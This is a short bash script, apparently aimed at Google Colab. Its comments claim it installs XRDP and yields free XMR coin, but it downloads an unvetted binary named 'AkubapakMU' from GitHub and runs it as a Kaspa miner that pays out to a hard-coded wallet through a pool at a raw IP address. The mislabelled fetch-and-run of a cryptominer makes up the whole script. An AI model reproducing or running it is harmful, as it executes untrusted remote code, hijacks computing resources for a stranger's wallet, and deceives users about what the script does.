# /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R AkubapakMU

wget https://github.com/sbwsmg/kaspa/raw/main/AkubapakMU
chmod 700 AkubapakMU

#!/bin/bash

POOL=159.223.188.176:80
WALLET=kaspa:qph4qcuawpx3zdkc5hxznjffrg057g4tkdntrgr62xmfltync2jyg0hutdayg

./AkubapakMU --algo KASPA --pool $POOL --user $WALLET $@
